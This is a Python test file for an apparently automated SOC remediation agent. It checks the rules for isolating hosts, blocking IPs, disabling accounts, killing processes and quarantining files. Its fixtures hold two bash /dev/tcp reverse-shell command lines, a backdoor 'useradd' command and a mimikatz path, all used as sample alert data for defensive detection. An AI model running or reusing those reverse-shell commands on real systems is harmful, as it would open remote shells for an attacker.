"""Pure remediation logic (no Shuffle, Wazuh nor IRIS)."""

import ipaddress
import json

from soc_agent import iris as _iris_mod
from soc_agent import mitigate
from soc_agent.mitigate import (REMEDIATIONS, REVERTERS, _targets_by_machine,
                                _created_accounts, _task_desc, _interpret,
                                _is_private_ip, _canceled_tasks)

# NETWORKS_INTERNAL is empty by default (no test fleet): cases that test the
# "fleet IP" exclusion must declare a subnet explicitly.
_TEST_NETWORK = [ipaddress.ip_network("192.168.10.0/24")]


def _alert_proctitle(cmd: str, agent_id: str = "001") -> dict:
    """auditd alert carrying `cmd` in its hex proctitle (nul-separated args)."""
    hexp = cmd.replace(" ", "\x00").encode().hex()
    return {"agent_id": agent_id, "srcip": None, "srcuser": None, "entity": None,
            "raw": json.dumps({"full_log": f"type=PROCTITLE proctitle={hexp}"})}


def test_created_accounts_extracts_backdoor_from_proctitle():
    """The account created by useradd is captured from the auditd proctitle
    (level 3), without the syslog 5902 alert — that is what allows blocking the
    backdoor without raising the level of the user-add alert."""
    al = [_alert_proctitle("useradd -m -s /bin/bash svcbackup")]
    assert _created_accounts(al) == ["svcbackup"]
    # ...and becomes a disable target, on the machine where it appears.
    targets = _targets_by_machine("propose_disable_user", {"id": 1}, al)
    assert ("001", "svcbackup") in targets


def test_created_accounts_excludes_protected_accounts():
    # root / system accounts are never auto-disable targets.
    assert _created_accounts([_alert_proctitle("useradd -m root")]) == []


def test_interpret_isolation_state():
    # Marker present -> isolated.
    e = _interpret('{"isolated": true, "since": "x"}', 0)
    assert e == {"isolated": True, "reachable": True,
                 "marker": {"isolated": True, "since": "x"}}
    # File absent (empty stdout, non-zero rc) -> not isolated.
    assert _interpret("", 1) == {"isolated": False, "reachable": True,
                                   "marker": None}
    # SSH failure -> unknown state.
    assert _interpret("", 255) == {"isolated": None, "reachable": False,
                                     "marker": None}
    # Unreadable but present marker -> isolated, no detail.
    e = _interpret("corrupted", 0)
    assert e["isolated"] is True and e["marker"] is None


def test_isolation_disable_kill_targets(monkeypatch):
    """Machine-by-machine resolution: each target carries the agent where the
    evidence was observed. (IP blocking is tested separately: it touches the
    assets API.)"""
    monkeypatch.setattr(mitigate, "not_isolatable_reason", lambda ag: None)
    inc = {"id": 1, "agent_id": "001"}
    alerts = [
        {"agent_id": "001", "srcip": "45.134.26.87", "srcuser": "jdupont",
         "entity": None, "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": "root",
         "entity": None, "raw": "{}"},
    ]
    # Isolation targets the machine (agent, agent).
    assert _targets_by_machine("propose_isolate_host", inc, alerts) == [("001", "001")]
    # Disable: named accounts, not generic ones (root).
    assert _targets_by_machine("propose_disable_user", inc, alerts) == [("001", "jdupont")]


def test_block_ip_excludes_fleet_and_assets_and_orders_public_first(monkeypatch):
    """Blocking: fleet subnets AND monitored agents' IPs are excluded (victim/
    pivot, never the attacker — a bug measured during a purple-team exercise),
    and public IPs are ordered first. Nothing is deduped: a bruteforce comes
    from N IPs, all of them blocked."""
    monkeypatch.setattr(_iris_mod, "_NETS_INTERNAL", _TEST_NETWORK)
    monkeypatch.setattr(mitigate, "_agent_ips", lambda: {"192.168.30.46"})
    inc = {"id": 1, "agent_id": "011"}
    alerts = [
        {"agent_id": "011", "srcip": "45.134.26.87", "srcuser": None,
         "entity": None, "raw": "{}"},   # attacker, public
        {"agent_id": "011", "srcip": "192.168.10.20", "srcuser": None,
         "entity": None, "raw": "{}"},   # fleet subnet -> excluded
        {"agent_id": "011", "srcip": "192.168.30.46", "srcuser": None,
         "entity": None, "raw": "{}"},   # an agent's IP (victim/pivot) -> excluded
        {"agent_id": "011", "srcip": "10.8.0.9", "srcuser": None,
         "entity": None, "raw": "{}"},   # private C2 outside the fleet -> blockable
    ]
    targets = _targets_by_machine("propose_block_ip", inc, alerts)
    vals = [ip for _ag, ip in targets]
    assert "192.168.10.20" not in vals          # fleet subnet
    assert "192.168.30.46" not in vals          # a monitored agent's IP
    assert set(vals) == {"45.134.26.87", "10.8.0.9"}
    assert vals[0] == "45.134.26.87"           # public first (attacker order)


def test_block_ip_extracts_c2_from_reverse_shell(monkeypatch):
    """The C2 of a /dev/tcp reverse shell (auditd execve, no srcip) becomes a
    blocking target; an INTERNAL /dev/tcp target (lateral movement) stays
    excluded. Regression measured: thousands of detections, zero blocking
    before the fix."""
    monkeypatch.setattr(_iris_mod, "_NETS_INTERNAL", _TEST_NETWORK)
    monkeypatch.setattr(mitigate, "_agent_ips", lambda: set())
    inc = {"id": 1, "agent_id": "011"}
    alerts = [
        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
         "rule_desc": "reverse shell",
         "raw": {"full_log": "bash -i >& /dev/tcp/45.9.1.2/4444 0>&1"}},   # external C2
        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
         "raw": {"full_log": "bash -i >& /dev/tcp/192.168.10.9/9001 0>&1"}},  # internal = lateral
    ]
    vals = [ip for _ag, ip in
            _targets_by_machine("propose_block_ip", inc, alerts)]
    assert "45.9.1.2" in vals          # external C2 -> blocked
    assert "192.168.10.9" not in vals   # internal target -> not blocked


def test_private_ip_orders_without_excluding():
    # _is_private_ip is used for sorting, not exclusion: a private C2 stays blockable.
    assert _is_private_ip("10.8.0.9") is True
    assert _is_private_ip("192.168.30.46") is True
    assert _is_private_ip("45.134.26.87") is False
    assert _is_private_ip("not-an-ip") is False


def test_kill_process_targets_implant_in_suspect_dir():
    """Kill: exact name of executables launched from /tmp, /dev/shm...; never a
    legitimate system binary."""
    inc = {"id": 1, "agent_id": "001"}
    alerts = [
        {"agent_id": "001", "srcip": None, "srcuser": None,
         "entity": "/dev/shm/.kworker", "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": None,
         "entity": "/usr/bin/bash", "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": None, "entity": None,
         "raw": json.dumps({"data": {"audit": {"exe": "/tmp/malware"}}})},
    ]
    assert _targets_by_machine("propose_kill_process", inc, alerts) == [
        ("001", ".kworker"), ("001", "malware")]


# --- Windows targeting (purple-team regression 2026-08-02) ------------------
#
# Windows eventchannel paths arrive with DOUBLED backslashes, and Wazuh stores
# them as-is. The system-directories filter therefore never matched: soc-agent
# sent 26 quarantine orders on signed System32 binaries of a domain controller,
# and killed every PowerShell and WinRM session on the machine. These tests
# pin down the expected behavior.

def _alert_win(agent_id="014", image=None, target_file=None, pid=None,
                srcuser=None, eid="1"):
    ev = {}
    if image:
        ev["image"] = image
    if target_file:
        ev["targetFilename"] = target_file
    if pid:
        ev["processId"] = pid
    return {"agent_id": agent_id, "srcip": None, "srcuser": srcuser,
            "entity": None,
            "raw": json.dumps({"data": {"win": {"system": {"eventID": eid},
                                                "eventdata": ev}}})}


def _win(monkeypatch, agents=("014",), dcs=("014",)):
    monkeypatch.setattr(mitigate.config, "AGENTS_WINDOWS", set(agents))
    monkeypatch.setattr(mitigate.config, "AGENTS_DC", set(dcs))


def test_norm_win_path_unfolds_doubled_backslashes():
    assert (mitigate._norm_win_path(r"C:\\Windows\\System32\\cmd.exe")
            == r"C:\Windows\System32\cmd.exe")
    assert mitigate._norm_win_path('"C:\\\\Temp\\\\a.exe"') == r"C:\Temp\a.exe"


def test_quarantine_spares_system32_despite_doubled_backslashes(monkeypatch):
    """The exact purple-team case: cmd.exe and net.exe of a DC must NOT be
    targets, and the dropped implant must remain one."""
    _win(monkeypatch)
    alerts = [
        _alert_win(image=r"C:\\Windows\\System32\\cmd.exe"),
        _alert_win(image=r"C:\\Windows\\System32\\net.exe"),
        _alert_win(image=r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        _alert_win(image=r"C:\\AtomicRedTeam\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"),
    ]
    targets = _targets_by_machine("propose_quarantine_file", {"id": 1}, alerts)
    assert targets == [("014", r"C:\AtomicRedTeam\ExternalPayloads\mimikatz\x64\mimikatz.exe")]


def test_quarantine_ignores_applocker_probes(monkeypatch):
    _win(monkeypatch)
    alerts = [_alert_win(
        target_file=r"C:\\Users\\Admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_aokpwtrq.13g.ps1")]
    assert _targets_by_machine("propose_quarantine_file", {"id": 1}, alerts) == []


def test_kill_windows_refuses_generic_image_without_pid(monkeypatch):
    """`powershell.exe` without a PID is not a target: killing by name would
    cut every admin and WinRM session on the machine."""
    _win(monkeypatch)
    alerts = [_alert_win(image=r"C:\\Users\\Public\\powershell.exe")]
    assert _targets_by_machine("propose_kill_process", {"id": 1}, alerts) == []


def test_kill_windows_targets_expected_pid_and_image(monkeypatch):
    _win(monkeypatch)
    alerts = [_alert_win(image=r"C:\\Users\\Public\\powershell.exe", pid="4321"),
               _alert_win(image=r"C:\\Temp\\mimikatz.exe", pid="777")]
    assert _targets_by_machine("propose_kill_process", {"id": 1}, alerts) == [
        ("014", "mimikatz.exe#777"), ("014", "powershell.exe#4321")]


def test_kill_windows_spares_system_binaries(monkeypatch):
    _win(monkeypatch)
    alerts = [_alert_win(image=r"C:\\Windows\\System32\\net.exe", pid="1234")]
    assert _targets_by_machine("propose_kill_process", {"id": 1}, alerts) == []


def test_disable_user_windows_ignores_srcuser_from_logons(monkeypatch):
    """The srcuser of a 4624 is the victim or a system identity. Only accounts
    CREATED by the attacker are automatically disable-able."""
    _win(monkeypatch)
    alerts = [_alert_win(srcuser="Système"),
               _alert_win(srcuser="ANONYMOUS LOGON"),
               _alert_win(srcuser="UMFD-0"),
               _alert_win(srcuser="jdupont")]
    assert _targets_by_machine("propose_disable_user", {"id": 1}, alerts) == []


def test_disable_user_windows_keeps_created_account(monkeypatch):
    """The account created by the attacker (4720) stays a target, and the
    action goes to a DC — even buried in system-identity logons."""
    _win(monkeypatch)
    creation = {
        "agent_id": "014", "srcip": None, "srcuser": "Administrateur",
        "entity": None,
        "raw": json.dumps({"data": {"win": {
            "system": {"eventID": "4720"},
            "eventdata": {"targetUserName": "art-backdoor"}}}}),
    }
    al = [creation, _alert_win(srcuser="Système")]
    assert _targets_by_machine("propose_disable_user", {"id": 1}, al) == [
        ("014", "art-backdoor")]


def test_well_known_windows_accounts_are_protected():
    for name in ("Système", "SYSTEM", "ANONYMOUS LOGON", "SERVICE LOCAL",
                "LOCAL SERVICE", "UMFD-0", "DWM-1", "LAB\\WIN-DC$"):
        assert mitigate._is_protected_account(name), name


# --- active-response verification loop ---------------------------------------

def test_gone_statuses_cover_the_lifecycle():
    """'sent' is NOT a success: the API took the command, nothing more. The
    2026-08-02 IRIS report announced 26 successful quarantines that had all
    been refused by the script."""
    assert set(mitigate.STATUSES_GONE) == {
        "sent", "confirmed", "no_effect", "agent_refused"}
    # Only an agent report counts as "Done" on the IRIS side.
    assert mitigate._STATUS_TASK["confirmed"] == "Done"
    assert mitigate._STATUS_TASK["sent"] != "Done"
    assert mitigate._STATUS_TASK["agent_refused"] == "Canceled"


def test_ar_status_maps_the_four_outcomes():
    assert mitigate._STATUS_AR == {"applied": "confirmed", "noop": "no_effect",
                                   "refused": "agent_refused", "error": "failed"}


def test_only_agent_responses_are_frozen():
    """'Gone' and 'succeeded' are not the same thing.

    A refusal is not replayed — it would be re-declined every cycle. A channel
    failure is. And above all 'sent' is NOT frozen: it means "the command left",
    not "it had the intended effect". Freezing it left an attacker account
    recreated under an already-open incident never disabled (measured during the
    exercise: `art-backdoor` frozen on an inherited 'sent').

    This test asserted the opposite until 2026-08-09: it required that EVERY
    gone-status be frozen, which the 'sent' fix made false. It had been failing
    since, describing a rule the code had deliberately abandoned.
    """
    agent_responses = {"confirmed", "no_effect", "agent_refused"}
    assert agent_responses <= set(mitigate._STATUSES_FROZEN)
    assert "canceled" in mitigate._STATUSES_FROZEN

    # Both replayable, for different reasons.
    assert "sent" not in mitigate._STATUSES_FROZEN
    assert "failed" not in mitigate._STATUSES_FROZEN

    # 'sent' remains a "gone" status — that is what distinguishes it from
    # 'dry_run', which sent nothing at all.
    assert "sent" in mitigate.STATUSES_GONE
    assert "dry_run" not in mitigate.STATUSES_GONE


def test_every_remediable_action_has_an_ar_script():
    """Without an entry in _SCRIPTS_AR, the agent report is never reconciled
    and the remediation stays 'sent' forever."""
    for action in REMEDIATIONS:
        if action in mitigate.MANUAL_ACTIONS:
            continue
        assert action in mitigate._SCRIPTS_AR, action


def test_open_case_and_escalation_are_outside_remediation():
    assert "open_case" not in REMEDIATIONS
    assert "close_false_positive" not in REMEDIATIONS
    assert "escalate_human" not in REMEDIATIONS


def test_canceled_tasks_keeps_only_canceled():
    """Reconciliation: only tasks in 'Canceled' trigger a reverse."""
    tasks = [
        {"task_id": 1, "status_name": "Done"},
        {"task_id": 2, "status_name": "Canceled"},
        {"task_id": 3, "status_name": "To do"},
        {"task_id": 4, "status_name": "Canceled"},
    ]
    assert _canceled_tasks(tasks) == {2, 4}
    assert _canceled_tasks([]) == set()
    assert _canceled_tasks(None) == set()


def test_reverse_for_reversible_actions_not_for_kill():
    """Isolation, IP blocking, disabling and quarantine have a reverse; kill
    does not (a killed process cannot be "unkilled")."""
    assert set(REVERTERS) == {"propose_isolate_host", "propose_block_ip",
                               "propose_disable_user", "propose_quarantine_file"}
    assert "propose_kill_process" not in REVERTERS


def test_task_desc_contains_what_why_undo():
    triage = {"verdict": "true_positive", "confidence": "high",
              "reason": "Ransomware en cours."}
    desc = _task_desc(triage, "001", "executed", "Shuffle",
                       "Isolation nftables.", "curl ... !host-unisolate.sh")
    assert "Ce qui a été fait" in desc
    assert "Pourquoi" in desc and "Ransomware en cours." in desc
    assert "Comment annuler" in desc and "unisolate" in desc
    assert "**Statut** : executed" in desc
